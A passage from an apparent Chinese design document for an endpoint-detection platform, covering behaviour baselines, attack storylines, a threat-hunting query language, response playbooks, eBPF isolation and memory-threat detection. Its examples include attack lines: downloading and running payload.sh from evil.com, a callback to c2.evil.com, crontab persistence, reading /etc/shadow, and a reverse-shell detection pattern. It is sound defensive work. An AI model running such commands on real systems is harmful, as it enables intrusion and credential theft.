│  • 写入速率 (次/分钟)                                    │
│  • 敏感路径访问频率 (/etc/shadow, /root/.ssh/)           │
│  • 示例: java 正常写日志，突然写 /etc/crontab → 异常     │
│                                                          │
│  维度 3: 网络连接画像 (NetworkProfile)                    │
│  ─────────────────────────────────────────────────────── │
│  • 常见目标 IP/端口集合                                   │
│  • 出站连接速率                                           │
│  • 内网 vs 外网比例                                       │
│  • DNS 查询域名模式 (长度分布 + 熵值)                    │
│  • 示例: crond 正常无外连，突然连接外部 IP:4444 → 异常   │
│                                                          │
│  维度 4: syscall 画像 (SyscallProfile) [仅 eBPF 模式]    │
│  ─────────────────────────────────────────────────────── │
│  • 常见 syscall 集合 + 调用频率分布                       │
│  • 异常 syscall 检测 (ptrace/memfd_create/process_vm_*)  │
│  • 权限变更 syscall (setuid/setgid/capset)               │
│  • 示例: python 脚本突然调用 ptrace → 异常               │
│                                                          │
│  元数据:                                                  │
│  • baseline_start: 基线开始时间                           │
│  • baseline_days: 已学习天数 (7 天成熟)                   │
│  • last_updated: 最后更新时间                             │
│  • event_count: 总事件数                                  │
│  • mature: baseline_days >= 7                             │
└──────────────────────────────────────────────────────────┘
```

### 16.3 统计偏差计算

```
对每个维度独立计算偏差分数 (deviation_score):

方法: 滑动窗口统计 vs 基线统计

  deviation_score = Σ(维度权重 × 维度偏差)

  维度偏差计算:
  ┌─────────────────────────────────────────────────────────┐
  │                                                         │
  │  1. 集合偏差 (新出现的元素)                              │
  │     score = (|current_set - baseline_set|) / |baseline| │
  │     示例: nginx 基线子进程集合 {worker}，                │
  │           当前出现 {worker, bash} → 偏差 = 1/1 = 100%   │
  │                                                         │
  │  2. 频率偏差 (速率异常)                                  │
  │     z_score = (current_rate - baseline_mean) / baseline_σ│
  │     score = min(z_score / 3, 1.0)  # 归一化到 0~1       │
  │     示例: 文件写入基线 2次/min σ=1，当前 20次/min       │
  │           z = (20-2)/1 = 18 → score = 1.0 (极端异常)    │
  │                                                         │
  │  3. 模式偏差 (行为模式变化)                              │
  │     检测 首次行为:                                       │
  │     • 首次访问敏感路径 → score += 0.3                    │
  │     • 首次外网连接 → score += 0.3                        │
  │     • 首次高危 syscall → score += 0.5                    │
  │                                                         │
  └─────────────────────────────────────────────────────────┘

权重分配:
  子进程维度: 0.30
  文件访问维度: 0.25
  网络连接维度: 0.25
  syscall 维度: 0.20 (用户态模式下为 0，权重均摊到其他三维)

最终 risk_score = deviation_score × 100 (0~100 分)
```

### 16.4 风险评分与告警

```
风险等级与响应策略:

  risk_score    等级          响应
  ─────────────────────────────────────────────
  0~30         正常          无动作
  31~50        关注          记录到事件流，不告警
  51~70        可疑          生成 medium 告警 + 建议排查
  71~85        高危          生成 high 告警 + 自动触发 YARA 扫描
  86~100       危急          生成 critical 告警 + 关联故事线引擎

告警内容:
  {
    "alert_type": "behavior_anomaly",
    "risk_score": 87,
    "target_exe": "/usr/sbin/nginx",
    "deviations": [
      {"dimension": "child_process", "detail": "首次 spawn bash", "score": 95},
      {"dimension": "network", "detail": "新增外连 45.33.x.x:4444", "score": 80},
      {"dimension": "file_access", "detail": "写入 /etc/crontab (首次)", "score": 75}
    ],
    "baseline_age_days": 14,
    "suggested_action": "investigate"
  }

降噪机制:
  • 基线未成熟 (< 7 天) 时，risk_score 乘以 0.5 衰减系数
  • 相同 exe 的行为异常告警 1 小时内只生成 1 次
  • 管理员可对特定 exe 设定 risk_score 偏移量 (已知高变异进程)
  • 白名单进程跳过 BDE 评估
```

### 16.5 Agent 端与 Server 端分工

```
Agent 端 (实时统计):
  ┌────────────────────────────────────────────────────────┐
  │ BehaviorCollector                                      │
  │                                                        │
  │ • 每个 exe_path 维护一个 BehaviorProfile (内存)        │
  │ • 事件到达 → 更新对应维度的滑动窗口计数器              │
  │ • 滑动窗口: 5 分钟粒度，保留最近 24 小时               │
  │ • 内存: ~500B/exe × 200 exe ≈ 100KB (可忽略)          │
  │ • 每 5 分钟聚合一次统计快照上报 Server                 │
  │ • Agent 不做最终评分决策，只做数据采集                  │
  └────────────────────────────────────────────────────────┘

Server 端 (分析决策):
  ┌────────────────────────────────────────────────────────┐
  │ BehaviorEngine                                         │
  │                                                        │
  │ • 接收 Agent 统计快照 → 聚合到长期基线                 │
  │ • 基线存储: Redis Hash (key = host_id:exe_path)        │
  │ • 实时偏差计算: 每个事件到达时与基线比对               │
  │ • 跨主机基线: 相同 exe 在不同主机的行为聚合            │
  │   → "nginx 在 800 台主机上的平均行为" 作为全局基线     │
  │   → 单台主机偏离全局基线 → 额外加分                    │
  │ • risk_score 计算 + 告警生成                           │
  │ • 基线定期持久化到 ClickHouse (每小时快照)             │
  └────────────────────────────────────────────────────────┘

跨主机基线 (全局视角):
  • 同一 exe 在多台主机的行为取交集 = 全局基线
  • 单台主机出现全局基线中没有的行为 → 额外偏差分
  • 场景: 攻击者在一台 nginx 上种了后门，其他 799 台正常
         → 该主机 nginx 行为偏离全局基线 → 检出
  • 最少需要 5 台主机运行同一 exe 才启用全局基线
```

---

## 十七、攻击故事线引擎

将离散告警关联为完整的攻击链路，帮助安全分析师在一个视图中理解攻击全貌，而非逐条告警排查。

### 17.1 架构总览

```
┌──────────────────────────────────────────────────────────┐
│                攻击故事线引擎 (Storyline Engine)           │
│                                                          │
│  Agent 端                        Server 端               │
│  ┌────────────────┐              ┌────────────────────┐  │
│  │ CausalTracker  │  ──事件流──▶ │ StorylineEngine    │  │
│  │                │              │                    │  │
│  │ • story_id 分配│              │ • 故事线聚合       │  │
│  │ • 因果链传播   │              │ • 攻击阶段识别     │  │
│  │ • 进程树跟踪   │              │ • 跨主机关联       │  │
│  └────────────────┘              │ • 时间线可视化     │  │
│                                  └────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

### 17.2 Agent 端因果追踪器 (CausalTracker)

```
核心思想: 通过进程树的父子关系传播 story_id

┌──────────────────────────────────────────────────────────┐
│  story_id 分配规则:                                       │
│                                                          │
│  1. 触发事件 = 第一个命中规则的事件                       │
│     → 分配新 story_id (格式: host_id:timestamp:seq)      │
│                                                          │
│  2. 因果传播:                                             │
│     • 触发进程的所有后续子进程继承 story_id               │
│     • 触发进程的文件操作继承 story_id                     │
│     • 触发进程的网络连接继承 story_id                     │
│     • 子进程的子进程递归继承 (沿进程树向下传播)           │
│                                                          │
│  3. 传播终止条件:                                         │
│     • 进程退出 → 该分支停止传播                           │
│     • story_id 存活超过 2 小时无新事件 → 标记 stale       │
│     • 进程树深度 > 16 层 → 停止向下传播 (防爆炸)         │
│                                                          │
│  实现:                                                    │
│    story_map: map[pid]string  // pid → story_id           │
│    process_exec → 检查 parent_pid 是否在 story_map 中     │
│      → 是: 子进程继承 parent 的 story_id                  │
│      → 否: 检查该事件是否命中规则                         │
│        → 命中: 分配新 story_id + 加入 story_map           │
│        → 未命中: 不关联故事线                              │
│                                                          │
│  示例:                                                    │
│    sshd (无 story) → bash (无 story)                      │
│      → wget malware.sh (命中规则, 分配 story_id=S-1247)  │
│        → chmod +x malware.sh (继承 S-1247)               │
│        → ./malware.sh (继承 S-1247)                      │
│          → curl c2.evil.com (继承 S-1247)                │
│          → cat /etc/shadow (继承 S-1247)                 │
│                                                          │
│  内存: map 条目 ~100B × 平均 50 个活跃 story ≈ 5KB       │
└──────────────────────────────────────────────────────────┘
```

### 17.3 Server 端故事线引擎 (StorylineEngine)

```
┌──────────────────────────────────────────────────────────┐
│  StorylineEngine                                          │
│                                                          │
│  1. 故事线聚合                                            │
│  ─────────────────────────────────────────────────────── │
│  • 按 story_id 聚合所有关联事件                           │
│  • 存储: Redis Hash (key = story_id)                     │
│    - events: 有序事件列表 (按 agent_timestamp)            │
│    - alerts: 关联的告警 ID 列表                          │
│    - hosts: 涉及的主机集合                                │
│    - status: active / stale / closed / escalated         │
│    - phase: 当前识别到的最高攻击阶段                      │
│    - first_seen / last_seen                               │
│  • TTL: active 2 小时无新事件 → stale; stale 24 小时 → closed │
│  • 持久化: closed 故事线写入 ClickHouse 长期保存          │
│                                                          │
│  2. 攻击阶段自动识别                                      │
│  ─────────────────────────────────────────────────────── │
│  基于 MITRE ATT&CK Kill Chain 自动标记阶段:              │
│                                                          │
│  阶段映射 (根据故事线中的事件/规则标签):                  │
│    initial_access:  外部 IP 入站连接 + 命中初始规则       │
│    execution:       shell 启动 / 脚本执行 / 下载执行      │
│    persistence:     crontab/systemd/rc.local 写入         │
│    privilege_escalation: SUID/sudo/kernel exploit 检测    │
│    defense_evasion: 日志删除 / 历史清除 / 时间篡改        │
│    credential_access: shadow/passwd 读取 / mimipenguin    │
│    lateral_movement: SSH 横向 / 内网扫描                  │
│    collection:      数据归档 / 敏感文件收集               │
│    exfiltration:    外传数据 / DNS 隧道 / 大文件上传      │
│    impact:          加密勒索 / 数据删除 / 挖矿            │
│                                                          │
│  阶段推进: 事件到达 → 匹配阶段标签 → 更新 phase 字段     │
│  多阶段 = 高置信度攻击 (覆盖 >= 3 个阶段 → 自动 escalate)│
│                                                          │
│  3. 跨主机关联                                            │
│  ─────────────────────────────────────────────────────── │
│  触发条件:                                                │
│    • 主机 A 故事线中出现连接主机 B 的事件 (SSH/lateral)   │
│    • 主机 B 在时间窗口内 (±5 分钟) 出现新故事线           │
│  关联方式:                                                │
│    • 两个 story_id 合并为同一个 parent_story_id           │
│    • 子故事线保持独立但可在 UI 上联合查看                 │
│    • 最多关联 20 台主机 (防止误关联爆炸)                  │
│                                                          │
│  4. 故事线评分                                            │
│  ─────────────────────────────────────────────────────── │
│  story_score = Σ(alert_severity_score) × phase_multiplier │
│                                                          │
│  alert_severity_score:                                    │
│    critical=40, high=20, medium=10, low=5, info=1        │
│  phase_multiplier:                                        │
│    1 阶段=1.0, 2 阶段=1.5, 3 阶段=2.0, 4+=3.0           │
│                                                          │
│  示例: 2 个 high + 1 个 medium + 3 个阶段                │
│    = (20+20+10) × 2.0 = 100 → 高优先级故事线             │
└──────────────────────────────────────────────────────────┘
```

### 17.4 故事线可视化

```
管理后台 - 故事线详情页:

┌─────────────────────────────────────────────────────────┐
│  故事线 #S-1247                                score: 100│
│  状态: 活跃    主机: host-092    持续: 14 分钟           │
│  阶段: execution → persistence → credential_access      │
│                                                         │
│  时间线:                                                │
│  14:23:01 ▶ wget http://evil.com/payload.sh             │
│              规则: MXEDR-0105 (download_exec) [high]    │
│  14:23:03 ▶ chmod +x /tmp/payload.sh                    │
│  14:23:03 ▶ /tmp/payload.sh                             │
│  14:23:05   ├─ curl http://c2.evil.com/config           │
│              规则: MXEDR-0071 (c2_callback) [high]      │
│  14:23:08   ├─ echo "* * * * * /tmp/payload.sh"         │
│              >> /var/spool/cron/root                     │
│              规则: MXEDR-0037 (crontab_persist) [medium] │
│  14:25:12   ├─ cat /etc/shadow                          │
│              规则: MXEDR-0042 (shadow_read) [medium]    │
│  14:37:01   └─ (等待更多事件...)                         │
│                                                         │
│  关联告警: 4 条    关联事件: 12 条                       │
│  [查看完整进程树]  [导出报告]  [标记已处理]              │
└─────────────────────────────────────────────────────────┘
```

---

## 十八、威胁狩猎引擎 (MQL)

MQL (MxSec Query Language) 是面向安全分析师的领域查询语言，编译为 ClickHouse SQL 执行，用于对历史事件数据进行主动威胁搜索。

### 18.1 语言设计

```
设计原则:
  • 语法接近自然语言，安全分析师 10 分钟上手
  • 编译为 ClickHouse SQL，利用列式存储的查询性能
  • 不发明新的运行时，零额外基础设施成本
  • 支持管道操作符 (|)，类似 Splunk SPL / KQL 风格

语法结构:
  search <事件源>
  | where <过滤条件>
  | <聚合/变换操作>
  | <排序/限制>

基本查询:
  // 查找所有反弹 Shell
  search events
  | where event_type == "process_exec"
  | where cmdline matches "bash.*-i.*>&.*/dev/tcp/"
  | where timestamp > now() - 24h

  编译为 ClickHouse SQL:
  SELECT * FROM events
  WHERE event_type = 'process_exec'
    AND match(cmdline, 'bash.*-i.*>&.*/dev/tcp/')
    AND timestamp > now() - INTERVAL 24 HOUR

上下文查询:
  // 某主机所有 root 执行的非标准路径进程
  search events
  | where host_id == "host-092"
  | where event_type == "process_exec"
  | where uid == 0
  | where NOT exe startswith "/usr/" AND NOT exe startswith "/bin/"
  | sort timestamp desc
  | limit 100

聚合查询:
  // 统计每台主机的外连独立 IP 数，找出异常高的
  search events
  | where event_type == "tcp_connect"
  | where NOT is_private_ip(remote_addr)
  | stats unique_count(remote_addr) as ext_ips by host_id
  | where ext_ips > 50
  | sort ext_ips desc

关联查询:
  // 下载后执行链: 先 curl/wget 下载，5 分钟内在同目录执行
  search events as download
  | where event_type == "process_exec"
  | where exe in ("curl", "wget")
  | join events as exec
    on download.host_id == exec.host_id
    within 5m
  | where exec.event_type == "process_exec"
  | where exec.cwd == download.cwd
  | where exec.exe NOT in ("curl", "wget", "apt", "yum")

进程树查询:
  // 查找 Web 服务器 spawn 的所有子进程链
  search events
  | where event_type == "process_exec"
  | where ancestor_has("nginx") OR ancestor_has("apache")
  | where exe in ("bash", "sh", "python", "perl", "php")
  | with process_tree(depth=5)
```

### 18.2 MQL 编译器

```
编译流程:

  MQL 文本
    ↓ Lexer (词法分析)
  Token 流
    ↓ Parser (语法分析)
  AST (抽象语法树)
    ↓ Validator (语义校验)
  Validated AST
    ↓ Optimizer (查询优化)
  Optimized AST
    ↓ SQLGenerator (SQL 生成)
  ClickHouse SQL
    ↓ Executor (执行)
  查询结果

编译器实现:
  • Go 实现，使用 participle 库构建解析器
  • 语义校验: 字段名存在性 + 类型匹配 + 函数签名
  • 查询优化:
    - 谓词下推: 将 where 条件尽早推到 ClickHouse
    - 时间范围强制: 无显式时间范围 → 自动加 7 天限制 (防全表扫描)
    - 索引提示: event_type/host_id 优先 (ClickHouse 主键列)
  • SQL 注入防护: 所有用户输入参数化 (?) 传递，不拼接

内置函数:
  is_private_ip(addr)       → 判断内网地址
  is_dns_tunnel(domain)     → 域名长度 > 50 || 熵 > 3.5
  ancestor_has(exe)         → 进程树祖先查询 (ClickHouse 子查询)
  unique_count(field)       → uniqExact()
  matches(pattern)          → match() 正则
  startswith(prefix)        → startsWith()
  contains(substr)          → position() > 0
  geoip(addr)               → dictGet() (GeoIP 字典表)

查询限制 (安全护栏):
  • 最大返回行数: 10000 (可配置)
  • 最大查询时间: 30s 超时
  • 最大时间跨度: 90 天
  • 并发查询数: 每用户最多 3 个
  • 需要 threat_hunter 角色权限
```

### 18.3 定时狩猎任务

```
支持将 MQL 查询保存为定时狩猎任务，自动执行:

  hunt_task:
    id: HUNT-001
    name: "检测 DGA 域名通信"
    mql: |
      search events
      | where event_type == "dns_query"
      | where is_dns_tunnel(domain)
      | where NOT domain endswith ".internal.corp"
      | stats count() as query_count by host_id, domain
      | where query_count > 100
    schedule: "0 */4 * * *"      # 每 4 小时
    lookback: 4h                  # 查询最近 4 小时数据
    alert_on_hit: true            # 有结果则生成告警
    alert_severity: high
    owner: "security-team"

管理:
  • API: CRUD 狩猎任务
  • 管理后台: 狩猎任务列表 + 历史结果 + 命中趋势
  • 执行记录: 每次执行保存结果摘要 + 耗时 + 命中数
  • 共享: 狩猎任务可导出为 YAML，通过社区规则仓库共享
```

### 18.4 交互式查询界面

```
管理后台 - 威胁狩猎页面:

┌─────────────────────────────────────────────────────────┐
│  MQL 查询                                               │
│  ┌───────────────────────────────────────────────────┐  │
│  │ search events                                     │  │
│  │ | where event_type == "process_exec"              │  │
│  │ | where ancestor_has("nginx")                     │  │
│  │ | where exe in ("bash", "sh")                     │  │
│  │ | sort timestamp desc                             │  │
│  └───────────────────────────────────────────────────┘  │
│  [执行] [保存为狩猎任务] [导出]   耗时: 1.2s  结果: 47  │
│                                                         │
│  ┌───────────────────────────────────────────────────┐  │
│  │ timestamp          host     exe   cmdline         │  │
│  │ 2026-05-15 14:23  host-092 bash  bash -i >& ...  │  │
│  │ 2026-05-15 11:05  host-017 sh    sh -c whoami    │  │
│  │ ...                                               │  │
│  └───────────────────────────────────────────────────┘  │
│                                                         │
│  语法提示: 字段名自动补全 + 函数签名提示                │
│  查询历史: 最近 50 条查询记录                           │
│  查询模板: 预置常用狩猎查询 (点击即用)                  │
└─────────────────────────────────────────────────────────┘
```

---

## 十九、自动编排引擎 (Playbook)

将复杂的安全响应流程编排为可复用的 YAML Playbook，支持条件分支、人工审批、多步动作串联。

### 19.1 Playbook 格式

```yaml
# 示例: 勒索软件响应 Playbook
id: PB-001
name: ransomware_response
description: 勒索软件检测后自动响应流程
version: 1
trigger:
  rule_tags: [ransomware]            # 匹配规则标签触发
  min_severity: high                 # 最低触发等级

steps:
  - id: step_1
    name: 立即隔离主机
    action: isolate_host
    params:
      level: 2                       # 标准隔离 (断外网保管控)
      reason: "勒索软件自动隔离"
    on_failure: goto step_notify     # 隔离失败直接通知

  - id: step_2
    name: 终止恶意进程
    action: kill_process
    params:
      target: "trigger.pid"          # 触发告警的进程
      kill_children: true            # 同时杀子进程树

  - id: step_3
    name: YARA 深度扫描
    action: trigger_scan
    params:
      scan_type: full_yara           # 全盘 YARA 扫描
      scan_path: "/"
      priority: urgent

  - id: step_4
    name: 收集取证信息
    action: collect_forensics
    params:
      items:
        - process_tree               # 完整进程树快照
        - open_files                 # 打开的文件列表
        - network_connections        # 活跃网络连接
        - recent_file_changes        # 最近 1 小时文件变更
        - memory_maps                # 进程内存映射

  - id: step_5
    name: 人工确认是否恢复
    action: approval
    params:
      approvers: ["admin", "security-lead"]
      timeout: 24h                   # 24 小时无响应自动升级
      timeout_action: escalate
      message: |
        主机 {{host_id}} 检测到勒索软件，已自动隔离。
        扫描结果: {{step_3.result.summary}}
        请确认是否解除隔离。

  - id: step_6
    name: 解除隔离
    action: release_isolation
    depends_on: step_5               # 等待审批通过
    condition: "step_5.result == 'approved'"

  - id: step_notify
    name: 通知安全团队
    action: notify
    params:
      channels: [webhook, email]
      template: ransomware_alert
      recipients: ["security-team"]
    always_run: true                 # 无论前面步骤成功失败都执行
```

### 19.2 Playbook 引擎架构

```
┌──────────────────────────────────────────────────────────┐
│  Playbook Engine (Server 端)                              │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Trigger Matcher                                     │  │
│  │                                                     │  │
│  │ 告警到达 → 匹配 Playbook 触发条件                   │  │
│  │ • rule_tags 匹配                                    │  │
│  │ • min_severity 过滤                                 │  │
│  │ • host_group 过滤 (可选)                            │  │
│  │ • 同一告警只触发一个 Playbook (优先级最高的)        │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Step Executor                                       │  │
│  │                                                     │  │
│  │ 支持的 action 类型:                                 │  │
│  │ • kill_process   — 终止进程 (gRPC → Agent)         │  │
│  │ • quarantine     — 隔离文件 (gRPC → Agent)         │  │
│  │ • isolate_host   — 主机网络隔离 (gRPC → Agent)     │  │
│  │ • release_isolation — 解除隔离 (gRPC → Agent)      │  │
│  │ • block_ip       — 封堵 IP (gRPC → Agent)         │  │
│  │ • trigger_scan   — 触发扫描 (gRPC → Agent)        │  │
│  │ • collect_forensics — 取证信息收集 (gRPC → Agent)  │  │
│  │ • notify         — 通知 (Webhook/Email/钉钉/飞书) │  │
│  │ • approval       — 人工审批节点 (生成待办)         │  │
│  │ • webhook        — 调用外部 API (自定义集成)       │  │
│  │ • wait           — 等待指定时间                     │  │
│  │ • mql_query      — 执行 MQL 查询并判断结果         │  │
│  │                                                     │  │
│  │ 每步执行记录:                                       │  │
│  │ • 开始时间 / 结束时间 / 耗时                        │  │
│  │ • 执行结果 (success/failed/timeout/skipped)        │  │
│  │ • 输出数据 (供后续步骤引用)                         │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Execution State Machine                             │  │
│  │                                                     │  │
│  │ 状态: pending → running → step_N → waiting_approval │  │
│  │       → completed / failed / cancelled              │  │
│  │                                                     │  │
│  │ 持久化: MySQL (playbook_executions 表)              │  │
│  │ • 每步状态变更即持久化                              │  │
│  │ • Server 重启后从数据库恢复执行状态                 │  │
│  │ • 长时间等待的审批步骤: 重启后继续等待              │  │
│  │                                                     │  │
│  │ 并发控制:                                           │  │
│  │ • 同一主机同时最多 1 个 Playbook 执行              │  │
│  │ • 新触发排队等待，不重复执行                        │  │
│  │ • 手动取消: API 随时可取消运行中的 Playbook         │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  安全约束:                                                │
│  • Playbook 创建/修改需要 playbook_admin 角色             │
│  • 包含 kill/isolate 动作的 Playbook 需要二次确认        │
│  • Playbook 受全局熔断器控制 (十五章)                     │
│  • 所有动作执行审计日志不可删除                           │
└──────────────────────────────────────────────────────────┘
```

### 19.3 内置 Playbook 模板

```
平台内置 Playbook (开箱即用，可自定义):

  PB-001: 勒索软件响应
    触发: [ransomware] + severity >= high
    流程: 隔离 → 杀进程 → 全盘扫描 → 取证 → 审批解除

  PB-002: 反弹 Shell 响应
    触发: [reverse_shell] + severity >= high
    流程: 杀进程 → 封堵目标 IP → 扫描同目录文件 → 通知

  PB-003: 挖矿程序响应
    触发: [cryptominer] + severity >= medium
    流程: 杀进程 → 隔离二进制 → 封堵矿池 IP → 检查 crontab 持久化

  PB-004: 凭据窃取响应
    触发: [credential_access] + severity >= high
    流程: 告警 → 收集取证 → 审批 (是否隔离) → 通知运维轮换凭据

  PB-005: 容器逃逸响应
    触发: [container_escape] + severity >= critical
    流程: 隔离宿主机 → 杀逃逸进程 → 取证 → 审批 → 通知 K8s 管理员
```

---

## 二十、主机网络隔离

在 Agent 端通过 eBPF 内核级能力实现主机网络隔离，保证攻击者无法从用户态绕过，同时保留安全管控通道。

### 20.1 eBPF 隔离架构

```
┌──────────────────────────────────────────────────────────┐
│            eBPF 网络隔离架构 (kernel >= 5.7)              │
│                                                          │
│  两层 eBPF 程序协同工作:                                  │
│                                                          │
│  Layer 1: cgroup/connect4 + cgroup/connect6              │
│  ─────────────────────────────────────────────────────── │
│  挂载点: 目标进程 cgroup (或 root cgroup = 全主机)       │
│  触发时机: 任何进程调用 connect() 时                      │
│  行为:                                                    │
│    • 查询 BPF Map (isolation_policy)                     │
│    • 目标 IP:Port 在白名单中 → 放行                      │
│    • 目标 IP:Port 不在白名单中 → 返回 -EPERM (拒绝连接) │
│  效果: 所有出站连接受控，攻击者 connect() 直接失败       │
│                                                          │
│  Layer 2: XDP (可选，高性能入站过滤)                      │
│  ─────────────────────────────────────────────────────── │
│  挂载点: 物理网卡 (eth0)                                  │
│  触发时机: 数据包到达网卡驱动层                           │
│  行为:                                                    │
│    • 解析 IP 头 → 查询 BPF Map (allowed_inbound)         │
│    • 匹配白名单 → XDP_PASS                               │
│    • 不匹配 → XDP_DROP (在驱动层丢弃，不进协议栈)       │
│  效果: 入站过滤，数据包不到达用户态，攻击者无法接收数据  │
│                                                          │
│  BPF Maps (策略存储):                                     │
│    isolation_policy:  LRU_HASH { ip:port → allow/deny }  │
│    allowed_inbound:   LRU_HASH { src_ip → allow }        │
│    isolation_level:   ARRAY[1] { level: u8 }             │
│    isolation_stats:   PERCPU_ARRAY { blocked/allowed }   │
│                                                          │
│  用户态控制:                                              │
│    Agent 收到 Server 隔离指令 → 更新 BPF Maps            │
│    策略变更即时生效 (无需重新加载 eBPF 程序)              │
└──────────────────────────────────────────────────────────┘
```

### 20.2 三级隔离策略

```
Level 1: 选择性隔离 (封堵特定目标)
  ─────────────────────────────────────────────────
  场景: 封堵恶意 C2 IP / 矿池地址，业务不受影响
  实现:
    • isolation_policy 中添加特定 IP → deny
    • 其他所有连接默认放行
    • 可动态添加/移除封堵条目
  白名单: 不需要 (默认放行)
  业务影响: 无

Level 2: 标准隔离 (断外网保管控)
  ─────────────────────────────────────────────────
  场景: 确认入侵后隔离主机，保留管理通道
  实现:
    • isolation_policy 默认策略切换为 deny-all
    • 白名单:
      - Server IP:Port (管控通道)
      - DNS Server IP:53 (可选，部分场景需要)
      - 管理员跳板机 IP (SSH 访问)
    • 入站同步限制 (XDP 层)
  白名单配置下发: Server → Agent (gRPC)
  业务影响: 外网断开，内网管控正常

Level 3: 完全隔离 (仅保留管控)
  ─────────────────────────────────────────────────
  场景: 高危事件 (勒索/蠕虫)，紧急断网
  实现:
    • deny-all + 最小白名单
    • 仅允许: Server IP:gRPC_Port
    • DNS 不放行
    • SSH 不放行 (管理员通过 Server 远程操作)
  业务影响: 完全隔离，仅 Agent ↔ Server 通信

隔离生命周期:
  隔离指令 (Server gRPC) → Agent 更新 BPF Maps → 即时生效
  → Agent 确认隔离生效 → 上报 isolation_active 事件
  → 管理员审批解除 → Server 下发解除指令
  → Agent 清空 BPF Maps → 恢复正常
  → 上报 isolation_released 事件

  超时自动解除: 可配置 (默认不超时，需手动解除)
  故障保护: Agent 崩溃 → eBPF 程序仍在内核运行 → 隔离持续
            Watchdog 重启 Agent → 读取隔离状态 → 继续维持
```

### 20.3 用户态降级方案

```
低内核版本 (< 5.7 或无 BPF_PROG_TYPE_CGROUP_SOCKOPT):

  降级方案见十一章 11.2 节第 3 项 (iptables + nftables + 巡检)
  已知局限: iptables -F 到重写之间有 ~3s 绕过窗口

  eBPF 隔离 vs 用户态隔离对比:
  ┌─────────────┬────────────────────┬──────────────────────┐
  │             │ eBPF 隔离           │ iptables 降级         │
  ├─────────────┼────────────────────┼──────────────────────┤
  │ 绕过难度     │ 攻击者无法绕过      │ root 可 iptables -F  │
  │ 生效延迟     │ < 1ms (Map 更新)   │ < 100ms (规则写入)   │
  │ 内核开销     │ 极低 (BPF JIT)     │ 低 (netfilter)       │
  │ 持久性       │ Agent 崩溃仍生效   │ 需 Watchdog 巡检维持 │
  │ 策略粒度     │ IP:Port 级别       │ IP:Port 级别         │
  │ 进程级隔离   │ 支持 (cgroup 粒度) │ 不支持 (全主机)      │
  └─────────────┴────────────────────┴──────────────────────┘
```

---

## 二十一、内存威胁检测

检测无文件攻击 (Fileless Attack)：恶意代码不落盘，直接在内存中加载执行。

### 21.1 eBPF 内存操作监控

```
┌──────────────────────────────────────────────────────────┐
│  内存威胁检测 (eBPF 模式)                                 │
│                                                          │
│  监控点 1: memfd_create 系统调用                          │
│  ─────────────────────────────────────────────────────── │
│  Hook: tracepoint/syscalls/sys_enter_memfd_create        │
│  检测: 匿名内存文件创建 → 典型无文件攻击载体             │
│  事件:                                                    │
│    {                                                     │
│      event_type: "memory_exec",                          │
│      sub_type: "memfd_create",                           │
│      pid, exe, cmdline, uid,                             │
│      memfd_name: "..." // memfd 创建时的名称             │
│    }                                                     │
│  告警条件: 非系统进程调用 memfd_create → high 告警       │
│                                                          │
│  监控点 2: ptrace 系统调用                                │
│  ─────────────────────────────────────────────────────── │
│  Hook: tracepoint/syscalls/sys_enter_ptrace              │
│  检测: 进程注入 (ptrace attach → 修改寄存器/内存)        │
│  事件:                                                    │
│    {                                                     │
│      event_type: "memory_exec",                          │
│      sub_type: "ptrace_attach",                          │
│      pid, exe, cmdline,                                  │
│      target_pid: ...,   // 被 attach 的目标进程          │
│      ptrace_request: ...,  // PTRACE_ATTACH/POKETEXT/... │
│    }                                                     │
│  告警条件:                                                │
│    • 非调试器 (gdb/strace/ltrace) 执行 ptrace → high     │
│    • PTRACE_POKETEXT/POKEDATA → critical (代码注入)      │
│                                                          │
│  监控点 3: mmap(PROT_EXEC) 可执行内存映射                 │
│  ─────────────────────────────────────────────────────── │
│  Hook: tracepoint/syscalls/sys_enter_mmap                │
│  过滤: 仅当 prot & PROT_EXEC 且 flags & MAP_ANONYMOUS   │
│  检测: 匿名可执行内存映射 → 可能加载 shellcode          │
│  事件:                                                    │
│    {                                                     │
│      event_type: "memory_exec",                          │
│      sub_type: "anon_exec_mmap",                         │
│      pid, exe, cmdline,                                  │
│      mmap_addr, mmap_len, mmap_prot, mmap_flags          │
│    }                                                     │
│  告警条件:                                                │
│    • 非 JIT 引擎 (java/node/python) 的匿名 EXEC mmap   │
│    • 已排除: ld.so 动态链接器、JVM、V8 引擎正常行为      │
│    • 白名单: JIT 引擎进程列表 (可配置)                   │
│                                                          │
│  监控点 4: mprotect 权限变更                              │
│  ─────────────────────────────────────────────────────── │
│  Hook: tracepoint/syscalls/sys_enter_mprotect            │
│  过滤: 仅当新权限包含 PROT_EXEC 且旧权限不含 PROT_EXEC  │
│  检测: W→X 或 RW→RWX 转换 (典型 shellcode 加载模式)     │
│  事件:                                                    │
│    {                                                     │
│      event_type: "memory_exec",                          │
│      sub_type: "mprotect_exec",                          │
│      pid, exe, cmdline,                                  │
│      addr, len, old_prot, new_prot                       │
│    }                                                     │
│  告警条件: 非 JIT 引擎的 RW→X 转换 → high              │
│                                                          │
│  eBPF 层预过滤 (减少用户态开销):                          │
│  • BPF Map 白名单: java/node/python/ruby 等 JIT 进程    │
│  • 匹配白名单的 mmap/mprotect 事件直接丢弃              │
│  • 仅非白名单进程的事件传递到用户态                       │
└──────────────────────────────────────────────────────────┘
```

### 21.2 内存 YARA 扫描

```
┌──────────────────────────────────────────────────────────┐
│  /proc/[pid]/mem YARA 扫描                                │
│                                                          │
│  触发条件 (不是盲扫，事件驱动):                           │
│  1. eBPF 检测到 memfd_create → 扫描创建进程内存          │
│  2. eBPF 检测到可疑 mprotect (W→X) → 扫描目标区域       │
│  3. BDE 行为引擎 risk_score > 70 → 扫描高风险进程       │
│  4. IOC 碰撞命中 (IP/Domain) → 扫描通信进程内存          │
│  5. 手动触发: 分析师通过 API 对指定进程发起内存扫描      │
│                                                          │
│  扫描流程:                                                │
│  ─────────────────────────────────────────────────────── │
│  1. 读取 /proc/[pid]/maps → 获取可执行内存区域列表       │
│  2. 过滤: 仅扫描 anon (匿名) + rwx/rx 区域              │
│     跳过: 已知 .so 映射 + [stack] + [vvar]               │
│  3. 读取 /proc/[pid]/mem → 提取目标区域内容              │
